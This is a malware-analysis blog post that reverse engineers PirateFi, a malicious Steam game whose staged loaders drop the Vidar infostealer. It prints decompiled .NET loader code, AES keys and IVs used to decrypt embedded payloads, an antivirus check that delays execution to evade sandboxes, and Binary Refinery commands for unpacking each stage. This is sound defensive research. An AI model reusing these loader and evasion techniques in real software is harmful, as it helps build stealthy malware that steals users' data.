---
description: Between May 2024 and January 2026, threat actors have been observed targeting Steam users by uploading malicious games to the Steam platform. At the time of writing, the FBI are currently investigating this. Affected games include BlockBlasters, Chemia, Dashverse/DashFPS, Lampy, Lunara, PirateFi, and Tokenova. In this post, we are reverse engineering PirateFi.
---

## Picking Apart PirateFi: Steam Game Malware

In February 2025, a new game hit the Steam marketplace in beta, titled "PirateFi". The free-to-play game was somewhat underwhelming due to the fact that it was uploaded in order to steal victims' information and hijack user accounts.

The game was taken down from the Steam marketplace, but the change history can be found here: https://steamdb.info/app/3476470/history/

Upon review, **Changelist #27351505** caught my eye due to the following line, showing a heavily embedded vbs script being added:

![Image](https://raw.githubusercontent.com/MZHeader/MZHeader.github.io/refs/heads/main/assets/2026-03-15%2013_30_44-Desktop%20-%20File%20Explorer.png)

This directory within the game files contains several launchers that ultimately execute Pirate.exe.

The directory contains the following files:

| Filename      | Purpose      |
| ------------- | ------------- |
| `piratefi.vbs` | Launches piratefi.bat |
| `piratefi.bat` | Launches batch2.vbs |
| `batch2.vbs` | Launches batch2.bat |
| `batch2.bat` | Launches Pirate.exe |
| `Pirate.exe` | Main Executable Payload |
| `Pirate` | Directory |
| `Engine` | Directory |

## Pirate.exe

Pirate.exe is a InnoSetup executable, the contents of which can be extracted with the following Binary Refinery pipeline:
```
ef Pirate.exe [| xt -j | d2p ]
```
This  will produce three directories - data, embedded and meta.

embedded/script.ps is the PowerShell installer script. It's main purpose is to execute the binary dropped by the installer - 'Howard.exe'.
Prior to doing so, it builds the command 'cmd.exe /C tasklist /FI "IMAGENAME eq <name>" /FO CSV /NH | find /I "<name>"' and searches for the following processes:

| Process | Product |
|---|---|
| `wrsa.exe` | Webroot SecureAnywhere |
| `opssvc.exe` | Quick Heal |
| `avastui.exe` | Avast |
| `avgui.exe` | AVG |
| `nswscsvc.exe` | Norton/Symantec |
| `sophoshealth.exe` | Sophos |

If any of these processes are found, the installer Sleeps for 193 seconds before proceeding, a common sandbox evasion technique.

## Howard.exe

I found Howard.exe quite difficult to analyse, but got lucky by setting a breakpoint on VirtualAlloc and identifying an indirect call to the API.

![Image](https://raw.githubusercontent.com/MZHeader/MZHeader.github.io/refs/heads/main/assets/Untitled%203.png)

The return address of the VirtualAlloc call in this case was 02BA0000 - our memory region where a buffer of memory is to be written to.

Setting a memory write breakpoint on this address, we identify a loop where a payload is being written:

![Image](https://raw.githubusercontent.com/MZHeader/MZHeader.github.io/refs/heads/main/assets/Screenshot%202026-03-15%20at%2014.25.07.png)

We can see the full buffer by resuming execution to when the loop completes.
Within the memory buffer are the magic bytes of a PE:

![Image](https://raw.githubusercontent.com/MZHeader/MZHeader.github.io/refs/heads/main/assets/Screenshot%202026-03-15%20at%2014.28.13.png)

To get the next payload, we'll dump this memory region to disk and carve the PE with the following Binary Refinery pipline:

```
ef Howard.exe_memory.bin | carve-pe | dump carved.exe
```

## SmartAssembly

This next stage payload is an assembly packed with SmartAssembly.
De4dot makes the assembly easier to read, with the Main function as follows:
```cs
		// Token: 0x060000D1 RID: 209 RVA: 0x00006990 File Offset: 0x00004B90
		static void Main()
		{
			byte[] array = null;
			while (array == null)
			{
				try
				{
					array = Class7.smethod_14();
				}
				catch
				{
				}
			}
			Assembly assembly = Class7.smethod_5(array);
			if (assembly != null)
			{
				Type type = Class7.smethod_99("S015sDJkvQDvP3a6cx.UyOmhW05bcEWWnZuqT", assembly);
				if (type != null)
				{
					Class7.smethod_26("AHQt3OKaB", type);
				}
			}
		}
```

smethod_14 takes an encrypted resource and AES decrypts it, it is then loaded and the AHQt3OKaB Method from the UyOmhW05bcEWWnZuqT Class from the S015sDJkvQDvP3a6cx Namespace is invoked.

```cs
		static byte[] smethod_14()
		{
			byte[] emyrsqaglox = Class1.Emyrsqaglox; // return (byte[])Class1.Cazmb.GetObject("Reydbozimwj", Class1.cultureInfo_0);
			byte[] array;
			using (Aes aes = Aes.Create())
			{
				aes.KeySize = 256;
				aes.Key = Convert.FromBase64String(Class0.string_0); // string_0 = UlPs+RiNkeAQjtjBHi2FZme93GOwtujN9g03qBhA2xM=
				aes.IV = Convert.FromBase64String(Class0.string_1); // string_1 = 8VSGg0PMrhcl1gUkFwmUlg==
				ICryptoTransform cryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (MemoryStream memoryStream2 = new MemoryStream(emyrsqaglox))
					{
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream2, cryptoTransform, CryptoStreamMode.Read))
						{
							cryptoStream.CopyTo(memoryStream);
							array = memoryStream.ToArray();
						}
					}
				}
			}
			return array;
		}
```

The embedded, encrypted resource can be decrypted with the following Binary Refinery pipeline:

```
ef Reydbozimwj | aes b64:UlPs+RiNkeAQjtjBHi2FZme93GOwtujN9g03qBhA2xM= -i b64:8VSGg0PMrhcl1gUkFwmUlg== | dump payload.bin
```

This reveals another assembly, this time protected with .NET Reactor.

## Defeating .NET Reactor

Navigating to the invoked method without any deobfuscation reveals an empty function:
```cs
public static void AHQt3OKaB()
{
}
```

So, I'll run the assembly through .NET Reactor Slayer, but I'll uncheck the option to deobfuscate method names as I want to be able to easily navigate back to the invoked function.

Deobfuscated Method:
```cs
// S015sDJkvQDvP3a6cx.UyOmhW05bcEWWnZuqT
// Token: 0x0600000C RID: 12 RVA: 0x00003744 File Offset: 0x00001944
public static void AHQt3OKaB()
{
	byte[] array = W9koEHYFJe2cbrx66DU.arrYByvGYZ(Resources.\uE004);
	using (MemoryStream memoryStream = new MemoryStream(VR8byCY85iHMmkWcA17.cJ7YglW56B(array)))
	{
		memoryStream.Position = 0L;
		UyOmhW05bcEWWnZuqT.WcVLolyxG(Serializer.Deserialize<G2hIrVIVBvIcoMgDTXd>(memoryStream));
	}
	string fileName = Process.GetCurrentProcess().MainModule.FileName;
	if (!UyOmhW05bcEWWnZuqT.XOvH6LNBw().Af8Ig31OwW.fqBIiaUG95.IWXefBb0wc())
	{
		UyOmhW05bcEWWnZuqT.ya6v99WBB(fileName.Remove(fileName.Length - 4));
	}
	else
	{
		UyOmhW05bcEWWnZuqT.ya6v99WBB(fileName);
	}
	FrDsKD89TcS5HRpmUBY.Qa5YncKYGt();
	new hJKfjd8vWo2m5BC6Wpx().l0Q8qruINT();
	ELCTdV8NxKVBikYyuFt.U8P82y4wOo();
	new JRh8eH84MCabEaYmU8A().Kfr8skRuwx();
	new TfSVu48dKmxvm8KEswT().h4U8uTcbdl();
	new RGocen86qh6N7GfwlvA().J8A8ZSQswQ();
	new tG0AJHYIeqKtAmw68dT().Bt5YQ0Q3TF();
	new s32S0o8MuDukiR5uEP1().nMf8SVA1Id();
	new iLAO0m8yYcShq5JETKM().zeu8rn43W3();
	new E9yQoj8YNIcMyXRnPVK().RuM80Cpwnv();
	new aJdpAdeh0RPe9qlWvH7().olpe3i1MNq();
	new M0cC6LIIEmdcvYv8TEE().g2xIQNJLQO();
	new o3aauu8LXkovY1QsImm().zRv8EciZLm();
	new YUBZYteWAfwDi3c3pfN().EWCeeeulAs();
	new OVqCl58Ja3WRt1OtofY().cCG8HjRSQI();
	new zVSXR08PBHganDMYBGO().gus8h2Aere();
	ELCTdV8NxKVBikYyuFt.oKg8xJX5v1();
	try
	{
		Process.GetCurrentProcess().Kill();
	}
	catch
	{
	}
	throw new Exception();
}
```

The first line of code shows us that a resource is being given as an argument to the arrYByvGYZ method.

arrYByvGYZ Method:
```cs
	// Token: 0x02000076 RID: 118
	internal class W9koEHYFJe2cbrx66DU
	{
		// Token: 0x060001F5 RID: 501 RVA: 0x00007AE4 File Offset: 0x00005CE4
		public static byte[] arrYByvGYZ(byte[] \u0020)
		{
			byte[] array2;
			using (Aes aes = Aes.Create())
			{
				aes.KeySize = 256;
				aes.Key = Convert.FromBase64String(FPtBe5YCL3LqueRW4xM.xLjYwbE09p(12081));
				aes.IV = Convert.FromBase64String(FPtBe5YCL3LqueRW4xM.xLjYwbE09p(12265));
				ICryptoTransform cryptoTransform = aes.CreateDecryptor(aes.Key, aes.IV);
				using (MemoryStream memoryStream = new MemoryStream())
				{
					using (MemoryStream memoryStream2 = new MemoryStream(\u0020))
					{
						using (CryptoStream cryptoStream = new CryptoStream(memoryStream2, cryptoTransform, CryptoStreamMode.Read))
						{
							cryptoStream.CopyTo(memoryStream);
							byte[] array = memoryStream.ToArray();
							array2 = array;
						}
					}
				}
			}
			return array2;
		}
```

The resource is then decrypted with AES.
The Key and IV are encrypted - FPtBe5YCL3LqueRW4xM.xLjYwbE09p is a string lookup routine that utilises a hashtable.

The decrypted resources is then passed to function cJ7YglW56B - which is responsible for decompressing the payload.

```cs
	// Token: 0x02000077 RID: 119
	internal static class VR8byCY85iHMmkWcA17
	{
		// Token: 0x060001F8 RID: 504 RVA: 0x00007BE0 File Offset: 0x00005DE0
		public static byte[] cJ7YglW56B(byte[] \u0020)
		{
			byte[] array3;
			using (MemoryStream memoryStream = new MemoryStream(\u0020))
			{
				byte[] array = new byte[4];
				memoryStream.Read(array, 0, 4);
				int num = BitConverter.ToInt32(array, 0);
				using (GZipStream gzipStream = new GZipStream(memoryStream, CompressionMode.Decompress))
				{
					byte[] array2 = new byte[num];
					gzipStream.Read(array2, 0, num);
					array3 = array2;
				}
			}
			return array3;
		}
```

I'm going to debug and set a breakpoint on 'return array3;' so that I can review the decrypted & decompressed payloads being passed through this function.

![Image](https://raw.githubusercontent.com/MZHeader/MZHeader.github.io/refs/heads/main/assets/Screenshot%202026-03-15%20175824.png)

In the Locals window we can see an array with an MZ header (4D 5A) - This is likely our next payload - we'll dump this to disk.

I was able to view all decrypted strings by setting a Watch window on the string table as it was loaded:

![Image](https://raw.githubusercontent.com/MZHeader/MZHeader.github.io/refs/heads/main/assets/Hashtable3.png)

## Final Payload - Vidar Infostealer

25cb28fc3c4704b938f5e95954c5a2ac1fa5d0cb40a568bde2ae1f6e1b7e7de3

